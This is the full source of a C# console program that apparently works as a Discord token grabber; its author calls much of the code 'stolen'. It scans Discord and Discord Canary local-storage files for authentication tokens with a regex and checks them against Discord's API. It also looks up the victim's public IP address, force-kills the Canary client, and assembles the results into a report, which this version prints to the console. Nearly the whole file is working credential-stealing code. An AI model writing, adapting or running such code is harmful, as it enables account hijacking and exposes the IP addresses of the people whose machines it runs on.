using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace ConsoleApp1
{
    class Program
    {
        /* Yeah i won't lie, many parts of this code are "stolen"
         * I changed the code a bit and also added the check for discord canary
         * feel free to change stuff
         */
        static String infos = "Hey there,\nHere's all the information provided below:\n";
        static String token1 = "notoken";
        static String token2 = "notoken";
        static void Main(string[] args)
        {
            foreach (string e in GetDiscordToken())
            {
                infos = infos + e + "\n";
                token1 = e;
            }

            foreach (string e in GetDiscordCanaryToken())
            {
                infos = infos + e + "\n";
                token2 = e;
            }
            Console.WriteLine(infos);
            Console.ReadLine();
        }

        static string[] GetDiscordToken()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
                + "\\discord\\Local Storage\\leveldb\\";

            if (!Directory.Exists(path)) return new string[] { "Discord Not Installed." };

            string[] ldb = Directory.GetFiles(path, "*.ldb");

            foreach (var ldb_file in ldb)
            {
                // Get IP and Token
                string ip = GrabIP();
                var text = File.ReadAllText(ldb_file);

                // Verify Valid Token Format
                string token_reg =
                    @"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}";
                Match token = Regex.Match(text, token_reg);
                if (token.Success)
                {
                    // Verify Valid Token
                    if (CheckToken(token.Value))
                    {
                        string[] finalData = { token.Value, "IP:" +ip };
                        return finalData;
                    }
                }
                continue;
            }

            return new string[] { "No Valid Tokens Found." };
        }

        static string[] GetDiscordCanaryToken()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
                + "\\discordcanary\\Local Storage\\leveldb\\";

            if (!Directory.Exists(path)) return new string[] { "Discord Canary Not Installed." };

            foreach (var process in Process.GetProcessesByName("DiscordCanary"))
            {
                process.Kill();
            }

            string[] ldb = Directory.GetFiles(path, "*.log");

            foreach (var ldb_file in ldb)
            {
                // Get IP and Token
                string ip = GrabIP();
                var text = File.ReadAllText(ldb_file);

                // Verify Valid Token Format
                string token_reg =
                    @"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}";
                Match token = Regex.Match(text, token_reg);
                if (token.Success)
                {
                    // Verify Valid Token
                    if (CheckToken(token.Value))
                    {
                        string[] finalData = { token.Value, "IP:" + ip };
                        return finalData;
                    }
                }
                continue;
            }

            return new string[] { "No Valid Tokens Found." };
        }

        static bool CheckToken(string token)
        {
            try
            {
                var http = new WebClient();
                http.Headers.Add("Authorization", token);
                var result = http.DownloadString("https://discordapp.com/api/v6/users/@me");
                if (!result.Contains("Unauthorized")) return true;
            }
            catch { }
            return false;
        }

        static string GrabIP()
        {
            try
            {
                return new WebClient().DownloadString("https://ip.42.pl/raw");
            }
            catch
            {
                return "none";
            }
        }
    }
}